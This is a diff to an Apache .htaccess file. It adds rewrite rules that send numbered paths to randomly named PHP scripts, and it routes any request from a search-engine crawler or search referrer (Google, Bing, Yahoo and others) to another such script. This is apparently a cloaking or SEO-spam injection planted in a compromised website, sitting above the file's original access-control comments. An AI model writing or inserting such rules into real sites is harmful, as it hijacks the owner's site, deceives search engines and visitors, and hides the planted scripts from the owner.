@@ -1,3 +1,17 @@
+RewriteEngine on
+RewriteRule ^6374733073/(.*)$ impractical-diggings.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^1117106982/(.*)$ expedition-encore.php [QSA,L]
+
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ assignment-gwenny.php?$1 [L]
+
 # Schematics: protection in required directory, encrypted/compressed psswd in inc, ip and file blocks in here, additional block in header.
 # Limit Options: GET, POST, PUT, DELETE, CONNECT, OPTIONS, PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, and UNLOCK
 # Deny From .spam.com: .spam.com works for www.spam.com or virtual.spam.com. And, if you'd like to block access from an entire domain, you can specify just part of an address or domain name. Note that inc files are direct file includes done "inside" the server, rather than being done via HTTP. As such, they should not be affected by .htaccess directives.
@@ -13,6 +27,8 @@
 
 <Limit GET POST PUT DELETE>
 	Order Deny,Allow
+	#	Deny From 65.168.117.
+	#
 	#	Rewrite:
 	#	http://httpd.apache.org/docs/mod/mod_rewrite.html#RewriteCond
 	#	http://www.webmasterworld.com/forum92/2884.htm
